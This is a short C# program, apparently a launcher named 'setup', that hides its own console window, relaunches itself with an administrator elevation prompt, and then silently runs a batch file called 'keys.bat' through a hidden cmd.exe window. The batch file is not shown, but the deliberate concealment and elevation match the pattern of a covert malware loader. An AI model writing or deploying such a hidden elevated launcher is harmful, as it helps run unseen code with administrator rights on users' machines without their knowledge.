using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace setup
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);


            if (!IsAdministrator())
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(System.Reflection.Assembly.GetEntryAssembly().Location, "");
                startInfo.Verb = "runas";
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                return;
            }
            else
            {
                var filename = "keys.bat";
                var fullPath = Path.GetFullPath(filename);
                var psi = new ProcessStartInfo();
                psi.WindowStyle= ProcessWindowStyle.Hidden;
                psi.CreateNoWindow = true;
                psi.FileName = @"cmd.exe";
                psi.Verb = "runas";
                psi.Arguments = "/C " + fullPath;

                try
                {
                    var process = new Process();
                    process.StartInfo = psi;
                    process.Start();
                    process.WaitForExit();
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }
        }

        private static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}